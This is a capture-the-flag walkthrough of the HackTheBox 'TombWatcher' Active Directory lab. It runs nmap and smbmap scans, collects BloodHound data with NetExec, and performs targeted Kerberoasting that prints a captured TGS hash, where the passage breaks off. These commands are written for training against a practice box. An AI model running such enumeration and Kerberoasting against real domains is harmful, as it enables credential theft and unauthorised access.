![](https://miro.medium.com/v2/resize:fit:875/1*eQW7fevcObt92KlLgngmKA.png)

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

This walkthrough covers the penetration testing process for the TombWatcher box on HackTheBox. It starts from initial reconnaissance with given credentials (henry / H3nry_987TGV!) and escalates to domain administrator access. The box involves Active Directory enumeration, Kerberoasting, password cracking, BloodHound analysis, AD permission abuse, and certificate template exploitation via Certipy. The environment is a Windows Server 2019 domain controller (DC01.tombwatcher.htb) at IP 10.10.11.72.

**Note:** All commands are run from a Kali Linux attack machine unless specified otherwise. Dates in logs are set to September 2025 due to simulated time (e.g., via faketime). Tools like NetExec (nxc), Impacket, Certipy, and Evil-WinRM are used.

# **1. Nmap Scan**

Start with an Nmap scan to identify open ports and services:

```
# Nmap 7.95 scan initiated Thu Sep 25 06:16:12 2025 as: /usr/lib/nmap/nmap --privileged -sCV -vv -Pn -oN nmap.txt 10.10.11.72
Nmap scan report for TombWatcher.htb (10.10.11.72)
Host is up, received user-set (0.31s latency).
Scanned at 2025-09-25 06:16:14UTC for 113s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-25 10:16:37Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-25T10:18:05+00:00; +4h00m01s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-25T10:18:04+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-25T10:18:05+00:00; +4h00m01s from scanner time.
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-25T10:18:04+00:00; +4h00m00s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 20899/tcp): CLEAN (Timeout)
|   Check 2 (port 26528/tcp): CLEAN (Timeout)
|   Check 3 (port 61752/udp): CLEAN (Timeout)
|   Check 4 (port 46167/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2025-09-25T10:17:24
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 25 06:18:07 2025 -- 1 IP address (1 host up) scanned in 114.57 seconds
```

**Key findings:**

- Open ports: 53 (DNS), 80 (HTTP/IIS), 88 (Kerberos), 135 (RPC), 139 (NetBIOS), 389/636 (LDAP/LDAPS), 445 (SMB), 464 (Kerberos Password Change), 593 (RPC over HTTP), 3268/3269 (Global Catalog LDAP/LDAPS), 5985 (WinRM).
- Domain: tombwatcher.htb.
- Host: DC01 (Domain Controller).
- OS: Windows Server 2019.
- Certificates indicate a CA: tombwatcher-CA-1.

# **SMB Enumeration**

Use smbmap with provided credentials to list shares:

```
$ smbmap -H 10.10.11.72 -u henry -p 'H3nry_987TGV!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.11.72:445 Name: TombWatcher.htb           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
[*] Closed 1 connections
```

# **2. AD Enumeration with NetExec (nxc)**

Collect BloodHound data for graph-based analysis:

```
$ nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d TOMBWATCHER.HTB --bloodhound -c All --dns-server 10.10.11.72 --verbose
[06:45:34] INFO     Socket info: host=10.10.11.72,               connection.py:165
                    hostname=10.10.11.72, kerberos=False,
                    ipv6=False, link-local ipv6=False
           INFO     Connecting to ldap://10.10.11.72 with no baseDN    ldap.py:173
[06:45:35] INFO     Resolved domain: tombwatcher.htb with dns,         ldap.py:257
                    kdcHost: 10.10.11.72
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
           INFO     Connecting to ldap://DC01.tombwatcher.htb -        ldap.py:432
                    DC=tombwatcher,DC=htb - 10.10.11.72 [3]
LDAP        10.10.11.72     389    DC01             [+] TOMBWATCHER.HTB\henry:H3nry_987TGV!
LDAP        10.10.11.72     389    DC01             Resolved collection methods: objectprops, rdp, psremote, acl, trusts, localadmin, dcom, session, container, group
[06:45:38] INFO     Found AD domain: tombwatcher.htb                 domain.py:709
           INFO     Connecting to LDAP server: dc01.tombwatcher.htb   domain.py:61
[06:45:56] INFO     Found 1 domains                                  domain.py:315
           INFO     Found 1 domains in the forest                    domain.py:354
[06:45:57] INFO     Found 1 computers                                domain.py:543
           INFO     Connecting to LDAP server: dc01.tombwatcher.htb   domain.py:61
[06:46:07] INFO     Found 9 users                              outputworker.py:147
[06:46:14] INFO     Found 53 groups                            outputworker.py:147
[06:46:15] INFO     Found 2 gpos                               outputworker.py:147
[06:46:16] INFO     Found 2 ous                                outputworker.py:147
[06:46:25] INFO     Found 19 containers                        outputworker.py:147
[06:46:26] INFO     Found 0 trusts                                  domains.py:154
           INFO     Starting computer enumeration with 10 workers  computers.py:78
           INFO     Querying computer: DC01.tombwatcher.htb       computers.py:288
LDAP        10.10.11.72     389    DC01             Done in 01M 17S
LDAP        10.10.11.72     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.72_2025-09-25_064538_bloodhound.zip

```

- Domain: tombwatcher.htb.
- Users: 9 (including henry).
- Groups: 53.
- Computers: 1 (DC01).
- Outputs zipped BloodHound data for analysis in BloodHound GUI.

**Henry has WriteSPN permission on Alfred**

![](https://miro.medium.com/v2/resize:fit:591/1*pRw5RD0_jU8hbcXpGgG92A.png)

# **3. Kerberoasting**

Exploit Kerberoastable accounts (users with SPNs) to get TGS tickets and crack hashes.

Tool Link: https://github.com/ShutdownRepo/targetedKerberoast

# **Get Kerberoastable Hash**

Use targetedKerberoast with simulated time (to avoid time skew issues):

```
$faketime -f "2025-09-25 12:00:00" python3 targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$90b792a3ee57a6e9d7d7c3c7de67d292$7d05b52fef9b50ec393658d0d4aef3134f87131c4e6eceaac1fa275f9233363d38b5d594185187426a28cb5565bb8c56e2e4763f5b6cfa06126111357a9d8965284bc42916b55de5e17f38f6a6cb024c37b2238c79733b212ee1cec65beb8cdfc28bbbed2222a70cc891d3f2f50956839d15809a7cbaa4fca88cf9db325ad4dcb50a6e91f25c472c176b5b8a49981baed0fca3e8028fe75d4f2b13968a5f5963b76bcad7ea099b6878f1cd54114a909a99047830779ec19b951f077b3de6a0b6a9f68e668c8555e5db37d5a407859b25f1fa82bf6da07e5a4815d61df2367301bf493fabbbcb357ef0065cc172e66feea74ddedb1daf8924f91473497edbba2a04289e67a64195cc2a9c4a5ba989fe9fc6c8b14bac4413edac2658300947b34fd58434543d7e8b56c3a4dd1f5933719e5e70add402db926b2f8e40924a74500115b4af712ab2c67e75e06e645d1a217565c98ea7722e42c6e6bfb04c22683893cad7f0ce731a7fd5075750f7ace9986a0fd6b8825421c44b988d95e2788bb715edf8c09b21635bd2c35405a39af186e27079af0f8e34597c0842fb078640890102ead1525e695130e7e2fb4b7cda3d390e93bbde58689b922fefe4722e1b7a9036dacc8e463ee6d4163e552cfad3ba445ed28188834ee21f1c016feb174573ec1649d0423a728112a2862a120f0a36e8cd05e07a498979c94f77711be65c801ff419ef5ec4b829695810966e8008a0d9acf0b6e3194718affc9a6422e82dcbd55209c133e364bc1d4fc7c6b3b3957bf8aa9a0d056c8953245bc7c210f8f291124babdbaba9ce42311336601361f3f79e6d585c90e729879f13be630fd8ff58ecb25cea44d831ed80786cfa7b59cc09b0bc3943a285e474b48f753a783f680a969a04e6e8a047e7b829f8f23e7452a262b00260f108d0580abc5007b8e3c459b3143cf025df33c09d85d8f00e42667ff1e220784cbb4ae927379046be821e8be5d0c554621e23bb58871d297d887ef297643aba94a854a4d8f856994e57139efc3bd88f72a3f8ded5d23f75a6ac0e935e3ec6e69ed8f922b19751406859c1be7fe0dbb74a5397b0c0fb5c8515af5a75e80e6067795b12b1b2aac6d7ea411545603c51298678e7455a4dc6602f6c7a9e6fe568cce25b17f497464e41c99834d5a85759854879a968d703f5490002584460387ac86d1a37daa40d3e0b5f90864b923b079f3ee8641a7795ddaa156088c65825f590ea337ffcafaaf6c7463b96a2e6fea62394467223c16f475ef85ddb49154426d98f6e0ad5459b5e7da4045065ad3e8e008a234bd11dd9287432618067d5eddb2e1d623bfd8e0e1e8973807149e9bcae0561a37c98269c852d441b1c0a641bd64c